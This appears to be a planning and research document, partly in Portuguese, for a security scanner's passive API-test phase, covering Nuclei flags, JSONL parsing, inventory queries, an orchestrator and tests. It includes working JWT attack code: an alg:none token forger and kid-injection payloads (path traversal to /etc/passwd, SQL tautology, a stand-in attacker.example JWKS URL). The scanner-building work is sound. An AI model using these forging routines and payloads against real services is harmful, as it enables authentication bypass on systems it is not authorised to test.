### Pitfall 9: Nuclei `-tags` — graphql, cors, misconfig, exposure são categorias oficiais
**What goes wrong:** Falhar ao encontrar templates porque tags estão escritas incorrectly (plural vs singular).

**Why it happens:** Nuclei templates usam tags no formato singular e lowercase: `misconfig`, `exposure`, `graphql`, `cors`. Confundir com `misconfigs`, `exposures`, `CORS` (case-sensitive) gera 0 findings.

**How to avoid:** Use exatamente o que CONTEXT/REQUIREMENTS listam: `misconfig,exposure,graphql,cors`. Valida via `nuclei -tags misconfig,exposure,graphql,cors -u https://example.com -silent -jsonl -nt -duc` (dry list template matches).

**Verification:** Templates dir `/tmp/nuclei/nuclei-templates/http/misconfiguration/`, `http/exposures/`, `http/misconfiguration/graphql/`, `http/misconfiguration/cors/` confirmam estrutura ([github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration)).

**Warning signs:** Nuclei exit 0 mas `findings.length === 0` em target conhecido vulnerável.

### Pitfall 10: `-rl` + `-timeout` + `-retries 0` são Complementares
**What goes wrong:** Setar `-rl 10` esperando 10 req/s mas esquecer de `-retries 0` — Nuclei re-tenta em erro 5xx/timeout, inflando req/s real.

**Why it happens:** Default retries é 1. Com retries ON, um template que timeouts X vezes gera X+1 requests, bypassa rate intent.

**How to avoid:** CONTEXT locked `-retries 0` — está correto. Adicione `-timeout 10` para cap cada request.

**Warning signs:** Logs de target mostrando bursts de requests além de 10/s.

## Code Examples

Verified patterns from official sources + existing codebase:

### Example 1: Parse Nuclei JSONL streaming with Zod

```typescript
// Source: server/services/scanners/vulnScanner.ts parseNucleiOutput pattern
//         shared/schema.ts:1741-1762 (NucleiFindingSchema existente)
import { NucleiFindingSchema } from '@shared/schema';

export function parseNucleiJsonl(stdout: string): Array<z.infer<typeof NucleiFindingSchema>> {
  const results: z.infer<typeof NucleiFindingSchema>[] = [];
  for (const rawLine of stdout.split('\n')) {
    const line = rawLine.trim();
    if (!line) continue;
    try {
      const obj = JSON.parse(line);
      // Nuclei emits kebab-case JSON but NucleiFindingSchema uses camelCase —
      // normalize field names before safeParse
      const normalized = {
        ...obj,
        type: 'nuclei',
        templateId: obj['template-id'],
        matchedAt: obj['matched-at'],
        matcherName: obj['matcher-name'],
        extractedResults: obj['extracted-results'],
        curlCommand: obj['curl-command'],
      };
      const parsed = NucleiFindingSchema.safeParse(normalized);
      if (parsed.success) results.push(parsed.data);
      else log.warn({ issues: parsed.error.issues, line: line.slice(0, 200) }, 'nuclei jsonl line rejected by schema');
    } catch (err) {
      log.warn({ err: String(err) }, 'nuclei jsonl line parse failure');
    }
  }
  return results;
}
```

### Example 2: Map Nuclei hit to ApiFindingEvidence

```typescript
// Source: shared/schema.ts:1225-1239 (ApiFindingEvidence interface)
//         shared/schema.ts:1546-1560 (apiFindingEvidenceSchema Zod — strict, 8KB cap)
import type { NucleiFinding } from '@shared/schema';
import type { ApiFindingEvidence } from '@shared/schema';

export function nucleiHitToEvidence(hit: NucleiFinding): ApiFindingEvidence {
  // NucleiFindingSchema captures: matchedAt, info.description/severity, request, response
  // The request/response raw HTTP bodies are optional in nuclei output; include when present.
  const rawRequest = (hit as any).request as string | undefined;   // raw HTTP wire text
  const rawResponse = (hit as any).response as string | undefined;

  return {
    request: {
      method: extractMethodFromRaw(rawRequest) ?? 'GET',
      url: hit.matchedAt,
      headers: extractHeadersFromRaw(rawRequest) ?? undefined,
      bodySnippet: extractBodyFromRaw(rawRequest)?.slice(0, 8192),
    },
    response: {
      status: parseInt((hit as any).response_status ?? '200', 10),
      headers: extractHeadersFromRaw(rawResponse) ?? undefined,
      bodySnippet: extractBodyFromRaw(rawResponse)?.slice(0, 8192),
    },
    extractedValues: {
      matcherName: hit.matcherName,
      extractedResults: hit.extractedResults,
      templateId: hit.templateId,
    },
    context: hit.info.description,
  };
}
```

### Example 3: JWT `alg:none` forge + kid injection

```typescript
// Source: https://datatracker.ietf.org/doc/html/rfc7519 + nodejs.org/api/buffer
//         Phase 10 decodeJwtExp.ts pattern (silent fail, parts.length guard)
export function forgeJwtAlgNone(jwt: string): { forged: string; originalAlg: string } {
  const parts = jwt.split('.');
  if (parts.length < 2) throw new Error('JWT inválido: menos de 2 segmentos');

  const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
  const originalAlg = String(header.alg ?? 'unknown');

  const forgedHeader = { ...header, alg: 'none' };
  const headerB64 = Buffer.from(JSON.stringify(forgedHeader), 'utf8').toString('base64url');
  // RFC 7519 alg=none → empty signature (3 segments with 3rd empty)
  return { forged: `${headerB64}.${parts[1]}.`, originalAlg };
}

export const KID_INJECTION_PAYLOADS = [
  { label: 'path-traversal-dev-null',   value: '../../../../../../../dev/null' },
  { label: 'path-traversal-etc-passwd', value: '../../../../../../../etc/passwd' },
  { label: 'sql-injection-tautology',   value: "' OR '1'='1" },
  { label: 'url-injection-external',    value: 'http://attacker.example/jwks.json' },
] as const;

export function injectKid(jwt: string, payloadValue: string): string {
  const parts = jwt.split('.');
  if (parts.length < 2) throw new Error('JWT opaco');
  const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
  header.kid = payloadValue;
  const headerB64 = Buffer.from(JSON.stringify(header), 'utf8').toString('base64url');
  return `${headerB64}.${parts[1]}.${parts[2] ?? ''}`;
}
```

### Example 4: API key leakage detector (mask-at-source)

```typescript
// Source: CONTEXT decision — prefix 3 chars + "***" mask
export function detectApiKeyLeakage(
  apiKeyPlaintext: string,
  probeResponses: Array<{ endpointId: string; body: string; status: number }>,
): Array<{ endpointId: string; leakedKeyPrefix: string }> {
  const hits: Array<{ endpointId: string; leakedKeyPrefix: string }> = [];
  // Matching strategy: exact substring. Heurística simples; Phase 14 pode refinar.
  // Filtra respostas 4xx/5xx para reduzir false positives de echo em error pages.
  for (const resp of probeResponses) {
    if (resp.status >= 400) continue;
    if (resp.body.includes(apiKeyPlaintext)) {
      // Mask-at-source: prefix 3 chars + *** (always, nunca armazena full)
      const leakedKeyPrefix = apiKeyPlaintext.slice(0, 3) + '***';
      hits.push({ endpointId: resp.endpointId, leakedKeyPrefix });
    }
  }
  return hits;
}

// Sampling strategy: top 5 GET endpoints by apiEndpointId (deterministic ORDER BY createdAt ASC)
// CONTEXT: "faz GET autenticado em até 5 endpoints GET da API"
export async function sampleGetEndpointsForLeakageProbe(
  apiId: string,
): Promise<ApiEndpoint[]> {
  return db.select()
    .from(apiEndpoints)
    .where(and(eq(apiEndpoints.apiId, apiId), eq(apiEndpoints.method, 'GET')))
    .orderBy(asc(apiEndpoints.createdAt))
    .limit(5);
}
```

### Example 5: API9 Inventory DB queries

```typescript
// Source: Phase 11 CONTEXT — "Phase 12 consome sinais Phase 11 via query direta"
import { and, eq, isNotNull, sql } from 'drizzle-orm';

export async function detectSpecPubliclyExposed(apiId: string): Promise<boolean> {
  const [row] = await db.select().from(apis)
    .where(and(
      eq(apis.id, apiId),
      isNotNull(apis.specUrl),
      isNotNull(apis.specHash),
    )).limit(1);
  return !!row;
}

export async function detectGraphQLIntrospectionOpen(apiId: string): Promise<boolean> {
  const [row] = await db.select().from(apis)
    .where(and(eq(apis.id, apiId), eq(apis.apiType, 'graphql'))).limit(1);
  if (!row || !row.specHash) return false;
  // Phase 11 persiste specHash pra GraphQL quando introspection succeeded.
  return true;
}

export async function detectHiddenKiterunnerEndpoints(apiId: string): Promise<ApiEndpoint[]> {
  // discoverySources = ['kiterunner'] EXCLUSIVE (array length 1, only kiterunner)
  // AND httpxStatus IN (200, 401, 403) — signal endpoint exists
  return db.select().from(apiEndpoints)
    .where(and(
      eq(apiEndpoints.apiId, apiId),
      sql`${apiEndpoints.discoverySources} = ARRAY['kiterunner']::text[]`,
      sql`${apiEndpoints.httpxStatus} IN (200, 401, 403)`,
    ));
}
```

### Example 6: Orchestrator stages loop (mirror Phase 11 pattern)

```typescript
// Source: server/services/journeys/apiDiscovery.ts lines 37-316 (1:1 template)
export async function runApiPassiveTests(
  apiId: string,
  opts: ApiPassiveTestOpts,
  jobId?: string,
): Promise<PassiveTestResult> {
  const startedAt = Date.now();
  const controller = new AbortController();
  const signal = controller.signal;
  const stagesRun: PassiveTestResult['stagesRun'] = [];
  const stagesSkipped: PassiveTestResult['stagesSkipped'] = [];
  let findingsCreated = 0, findingsUpdated = 0;
  const findingsByCategory: Record<string, number> = {};
  const findingsBySeverity: Record<string, number> = {};
  let cancelled = false;

  const api = await storage.getApi(apiId);
  if (!api) throw new Error(`API não encontrada: ${apiId}`);

  // ─── STAGE 1: API9 Inventory (DB-derived, runs BEFORE Nuclei per CONTEXT) ─────
  if (opts.stages.api9Inventory ?? true) {
    // ... runs queries, calls upsertApiFindingByKey ...
    stagesRun.push('api9_inventory');
  }
  if (signal.aborted || jobQueue.isJobCancelled(jobId ?? '')) { cancelled = true; return finalize(); }

  // ─── STAGE 2: Nuclei Passive ──────────────────────────────────────────────────
  if (opts.stages.nucleiPassive ?? true) {
    const preflight = await preflightNuclei(log);
    if (!preflight.ok) {
      stagesSkipped.push({ stage: 'nuclei_passive', reason: preflight.reason ?? 'preflight failed' });
    } else {
      // ... dryRun branch reads fixture JSONL; real branch spawns nuclei ...
      stagesRun.push('nuclei_passive');
    }
  }
  if (signal.aborted || jobQueue.isJobCancelled(jobId ?? '')) { cancelled = true; return finalize(); }

  // ─── STAGE 3: Auth-Failure ────────────────────────────────────────────────────
  if (opts.stages.authFailure ?? true) {
    // Loop endpoints with requiresAuth=true + compatible cred
    // For each: try 4 vectors (alg:none, kid inj, token reuse, leakage)
    // jobQueue.isJobCancelled check BETWEEN endpoints (cooperative cancel)
    stagesRun.push('auth_failure');
  }

  return finalize();

  function finalize(): PassiveTestResult {
    return {
      apiId, stagesRun, stagesSkipped,
      findingsCreated, findingsUpdated,
      findingsByCategory, findingsBySeverity,
      cancelled, dryRun: opts.dryRun ?? false,
      durationMs: Date.now() - startedAt,
    };
  }
}
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| `jsonwebtoken` npm package for JWT manipulation | Native `Buffer.from(x, 'base64url')` via `node:crypto` | Node 16+ (2021); Node 20 LTS default em 2024 | Zero supply-chain surface; forge alg:none é literalmente 4 linhas |
| Nuclei per-URL spawn | Single spawn + stdin batch OR `-l /dev/stdin` | Nuclei v2.x → v3.x patterns | 1 process, respeita rate global, processTracker simpler |
| Log scraping Phase 11 outputs para derive API9 | DB query direta em `apis`/`api_endpoints` | Phase 11 persiste sinais como state (specHash, discoverySources) | Idempotent, cross-job, replay-safe |
| Drizzle upsert com single key | `onConflictDoUpdate` com composite key array | Drizzle 0.39+ (Jan 2025) | Suporta `target: [col1, col2, col3]` nativamente |
| Manual kid injection discovery | Canonical payload list + single-pass request | PortSwigger / HackTricks pattern consolidation | 4 payloads cobrem >90% das implementations vulneráveis |
| JWT alg:none com 2-segment | 3-segment com 3ª vazia (RFC-stricter) | RFC 7519 interpretation alignment | Aceitação maior em parsers naive + jose-compatible |

**Deprecated/outdated:**
- `jsonwebtoken` package: sem necessidade em Phase 12. Reforçar "não adicionar". Caso futura Phase precise verify signatures (vs forge), `jose` > `jsonwebtoken` por API mais moderna.
- `-H` múltiplos em Nuclei: funciona mas complexa config. Auth-failure não usa Nuclei — usa `fetch` direto.
- Logging evidence bodies em production: SAFE-06 já bloqueia; Phase 14 reforça.

## Open Questions

1. **Nuclei JSONL — field name normalization (kebab-case vs camelCase)**
   - What we know: `NucleiFindingSchema` em `shared/schema.ts:1741` usa `templateId`, `matchedAt`, `matcherName` (camelCase). Nuclei output é `template-id`, `matched-at`, `matcher-name` (kebab).
   - What's unclear: Existing `vulnScanner.ts::parseNucleiOutput` faz essa normalização? Research files mostrou que o schema usa `.strip()` — unknown keys removidos, mas kebab→camel mapping precisa ser manual.
   - Recommendation: Plan deve incluir normalization step em `parseNucleiJsonl` (ver Example 1 acima). Alternatively: criar Zod schema derived que aceita kebab e transforma para camel via `.transform()`. Defer decision to plan author.

2. **Advisory lock for dedupe race**
   - What we know: Phase 12 sequencial dentro de job; jobs paralelos são edge case.
   - What's unclear: Phase 15 pode paralelizar APIs em um job; race window cresce.
   - Recommendation: Plan incluir `pg_advisory_xact_lock(hashtext(apiId))` no início de `upsertApiFindingByKey` transaction — custo 1 linha, cobre futuro.

3. **Nuclei request/response raw wire format parsing**
   - What we know: Nuclei com `-omit-raw` desabilita request/response. Sem flag, ambos vêm como **raw HTTP wire text** (string, não estruturado).
   - What's unclear: Nuclei v3+ pode ter flag para emit structured JSON. Docs atuais mostram raw string.
   - Recommendation: Plan incluir helper `extractMethodFromRaw` / `extractHeadersFromRaw` / `extractBodyFromRaw` simples — parse HTTP/1.1 wire format (3 linhas regex). Alternativa: usar `-omit-raw` + só `matched-at` + `info.description` em evidence (sacrifica body snippet mas elimina parsing).

4. **`readonly_analyst` role existe?**
   - What we know: `userRoleEnum` em `shared/schema.ts:32` = `['global_administrator', 'operator', 'read_only']`.
   - What's unclear: CONTEXT fala em "readonly_analyst" — é `read_only`? Convention mismatch.
   - Recommendation: Usar `read_only` (role existente) para RBAC de `GET /api/v1/api-findings`. Adicionar middleware `requireReadOnlyOrAbove` em `routes/middleware.ts` (novo) ou inline check por `req.user.role !== undefined`.

5. **Fixtures `[DRY-RUN]` prefix — como garantir remoção em produção**
   - What we know: CONTEXT decide prefix `[DRY-RUN] ` no title de findings dryRun.
   - What's unclear: Como garantir operador não vê esses findings no read path real.
   - Recommendation: Dois paths:
     1. Plan adiciona filter no `listApiFindings` que por default **exclui** titles começando com `[DRY-RUN]`, a menos que query param `?includeDryRun=true` explicitamente.
     2. OU: deixar findings visíveis — operador percebe pelo prefix.
   - Prefer option 1 (defensive); adds 1 query clause.

## Validation Architecture

### Test Framework

| Property | Value |
|----------|-------|
| Framework | Vitest 4.x (já no projeto, `vitest.config.ts` inclui `shared/**/*.test.ts`) |
| Config file | `vitest.config.ts` (raiz) |
| Quick run command | `npx vitest run server/__tests__/apiPassive` |
| Full suite command | `npx vitest run` |

### Phase Requirements → Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| TEST-01 | Nuclei args builder — exact flags `-tags misconfig,exposure,graphql,cors -rl 10 -timeout 10 -retries 0 -silent -jsonl` | unit | `npx vitest run server/__tests__/apiPassive/nucleiArgs.test.ts` | Wave 0 |
| TEST-01 | Nuclei JSONL → ApiFindingEvidence mapper (kebab→camel normalization + body truncation) | unit | `npx vitest run server/__tests__/apiPassive/jsonlMapper.test.ts` | Wave 0 |
| TEST-01 | API9 inventory DB queries (specPubliclyExposed, graphqlIntrospection, hiddenKiterunner) | unit | `npx vitest run server/__tests__/apiPassive/api9Inventory.test.ts` | Wave 0 |
| TEST-02 | JWT alg:none forge — header replace, signature empty, payload preserved | unit | `npx vitest run server/__tests__/apiPassive/jwtAlgNone.test.ts` | Wave 0 |
| TEST-02 | Kid injection — 4 canonical payloads + header rebuild | unit | `npx vitest run server/__tests__/apiPassive/kidInjection.test.ts` | Wave 0 |
| TEST-02 | Token reuse — skip opaque JWT (no exp), detect expired via decodeJwtExp | unit | `npx vitest run server/__tests__/apiPassive/tokenReuse.test.ts` | Wave 0 |
| TEST-02 | API key leakage — substring match + mask-at-source (prefix 3 + ***) | unit | `npx vitest run server/__tests__/apiPassive/apiKeyLeakage.test.ts` | Wave 0 |
| TEST-01 + TEST-02 | `upsertApiFindingByKey` — insert/update/reopen (status='closed') semantics | unit + integration (in-memory db mock) | `npx vitest run server/__tests__/apiPassive/dedupeUpsert.test.ts` | Wave 0 |
| TEST-01 + TEST-02 | Orchestrator: stages order, dryRun, cancellation cooperative, result shape | integration (mocked scanners) | `npx vitest run server/__tests__/apiPassive/orchestrator.test.ts` | Wave 0 |
| TEST-01 + TEST-02 | Route `POST /api/v1/apis/:id/test/passive` RBAC + Zod + 202 | integration (express listen + fetch) | `npx vitest run server/__tests__/apiPassive/route.test.ts` | Wave 0 |

### Sampling Rate

- **Per task commit:** `npx vitest run server/__tests__/apiPassive --reporter=default` (should run in ~3-5s para unit tests, ~10s com orchestrator)
- **Per wave merge:** `npx vitest run server/__tests__/apiPassive server/__tests__/apiDiscovery server/__tests__/apiCredentials` (Phase 9/10/11 regression)
- **Phase gate:** `npx vitest run` full suite green before `/gsd:verify-work`

### Wave 0 Gaps

- [ ] `server/__tests__/apiPassive/nucleiArgs.test.ts` — covers TEST-01 (nuclei CLI arg builder)
- [ ] `server/__tests__/apiPassive/jsonlMapper.test.ts` — covers TEST-01 (JSONL → ApiFindingEvidence with kebab→camel + 8KB truncation)
- [ ] `server/__tests__/apiPassive/api9Inventory.test.ts` — covers TEST-01 (DB-derived API9 signals)
- [ ] `server/__tests__/apiPassive/jwtAlgNone.test.ts` — covers TEST-02 (alg:none forge)
- [ ] `server/__tests__/apiPassive/kidInjection.test.ts` — covers TEST-02 (4 canonical payloads)
- [ ] `server/__tests__/apiPassive/tokenReuse.test.ts` — covers TEST-02 (exp check + skip opaque)
- [ ] `server/__tests__/apiPassive/apiKeyLeakage.test.ts` — covers TEST-02 (substring + mask)
- [ ] `server/__tests__/apiPassive/dedupeUpsert.test.ts` — covers TEST-01 + TEST-02 (upsert semantics)
- [ ] `server/__tests__/apiPassive/orchestrator.test.ts` — covers full pipeline (cancel, dryRun, result)
- [ ] `server/__tests__/apiPassive/route.test.ts` — covers POST route + RBAC
- [ ] `server/__tests__/fixtures/api-passive/nuclei-passive-mock.jsonl` — 3-5 representative findings
- [ ] `server/__tests__/fixtures/api-passive/jwt-alg-none-response.json` — mock "accepted" response
- [ ] `server/__tests__/fixtures/api-passive/jwt-kid-injection-response.json` — mock accepted kid
- [ ] `server/__tests__/fixtures/api-passive/jwt-expired-response.json` — mock accepted expired
- [ ] `server/__tests__/fixtures/api-passive/api-key-leakage-body.json` — mock body echoing key
- [ ] Framework install: none — Vitest 4.x + drizzle + zod already installed

## Sources

### Primary (HIGH confidence)
- **OWASP API Security Top 10 2023 (official)** — https://owasp.org/API-Security/editions/2023/en/0x11-t10/ — API2, API8, API9 category definitions
- **OWASP API2:2023 Broken Authentication** — https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/ — JWT vulnerabilities taxonomy
- **Nuclei official docs — Running** — https://docs.projectdiscovery.io/tools/nuclei/running — CLI flags (`-tags`, `-rl`, `-timeout`, `-silent`, `-jsonl`, `-l`)
- **Nuclei input formats** — https://docs.projectdiscovery.io/opensource/nuclei/input-formats — stdin + `-l` semantics
- **Node.js Buffer API — base64url encoding** — https://nodejs.org/api/buffer.html#buffers-and-character-encodings — native `Buffer.from(x, 'base64url')` support
- **Drizzle ORM upsert guide** — https://orm.drizzle.team/docs/guides/upsert — `onConflictDoUpdate` with composite key
- **Drizzle ORM insert reference** — https://orm.drizzle.team/docs/insert — target array for composite unique
- **RFC 7519 JSON Web Token** — https://datatracker.ietf.org/doc/html/rfc7519 — alg:none semantics
- **Existing code (HIGH for pattern reuse):**
  - `server/services/scanners/vulnScanner.ts` (v1.0 Nuclei wrapper template)
  - `server/services/journeys/nucleiPreflight.ts` (preflight memoizado)
  - `server/services/journeys/apiDiscovery.ts` (orchestrator pattern)
  - `shared/schema.ts:1225-1347` (api_findings table + Zod schemas)
  - `shared/schema.ts:1741-1764` (NucleiFindingSchema)
  - `server/services/credentials/decodeJwtExp.ts` (Phase 10 helper)
  - `server/storage/apiFindings.ts` (Phase 9 base facade)
  - `server/storage/apiEndpoints.ts::upsertApiEndpoint` (onConflictDoUpdate composite key pattern)
  - `server/services/scanners/api/preflight.ts` (Phase 11 preflight memoizado)
  - `server/__tests__/fixtures/nuclei/cve-with-classification.jsonl` (fixture format template)

### Secondary (MEDIUM confidence)
- **PortSwigger JWT kid path traversal lab** — https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal — canonical payloads (`../../../dev/null`)
- **PortSwigger JWT none algorithm** — https://portswigger.net/kb/issues/00200901_jwt-none-algorithm-supported — alg:none behavior
- **PentesterLab JWT kid injection glossary** — https://pentesterlab.com/glossary/jwt-kid-injection — SQL injection + path traversal vectors
- **Invicti JWT kid SQL injection** — https://www.invicti.com/web-application-vulnerabilities/jwt-signature-bypass-via-kid-sql-injection — payload enumeration
- **Nuclei templates GitHub** — https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration — directory structure (misconfig/exposure/graphql/cors subdirs)
- **Nuclei template v10.3.0 release notes** — https://github.com/projectdiscovery/nuclei-templates/releases/tag/v10.3.0 — current template taxonomy
- **DeepWiki Nuclei operators** — https://deepwiki.com/projectdiscovery/nuclei/3.4-matchers-and-extractors — matcher-name + extracted-results fields
- **Vitest test.todo reference** — https://vitest.dev/api/test — `it.todo` pattern for Wave 0 stubs

### Tertiary (LOW confidence — validate before load-bearing use)
- **Medium articles on JWT alg:none attack mechanics** — directional sanity check on forge logic; not load-bearing (RFC 7519 is the authoritative source).
- **Aquilax/Pentesterlab write-ups** — community depth on kid injection variants beyond the 4 canonical; Phase 12 sticks to the 4 locked by CONTEXT.

## Metadata

**Confidence breakdown:**
- **Standard stack:** HIGH — all libraries/binaries already installed/verified; zero new dependencies. `Buffer.from(x, 'base64url')` native since Node 16+. Nuclei binary preflight + templates pattern proven in v1.0. Drizzle `onConflictDoUpdate` composite key proven in Phase 11 `apiEndpoints.ts`.
- **Architecture:** HIGH — mirror of Phase 11 `apiDiscovery.ts` orchestrator; 1:1 pattern reuse. `upsertApiFindingByKey` is 80 LOC, clear contract. Route/CLI/doc templates from Phase 9/10/11.
- **Pitfalls:** HIGH — 10 pitfalls identified and verified against official docs + existing code. UTF-16 truncation, Nuclei rate semantics, JWT segment count all sourced from authoritative references.
- **JWT manipulation:** HIGH — `Buffer.from(x, 'base64url')` + `JSON.stringify` → `.toString('base64url')` is ~30 LOC total for all 3 vectors. Verified against RFC 7519 and Node docs.
- **API9 DB queries:** HIGH — direct reads from existing Phase 9/11 columns (specUrl, specHash, apiType, discoverySources, httpxStatus). No new indexes needed.
- **Dedupe race condition:** MEDIUM — advisory lock recommendation is conservative but not yet verified empirically. Phase 15 parallelism may require revalidation.
- **Nuclei JSONL field normalization:** MEDIUM — CamelCase schema vs kebab-case output means plan author must implement transform. Not a blocker but requires care.

**Research date:** 2026-04-20
**Valid until:** 2026-05-20 (Nuclei/Drizzle are stable; re-check if drizzle-orm bumped to 1.0 or Nuclei templates v11.x)
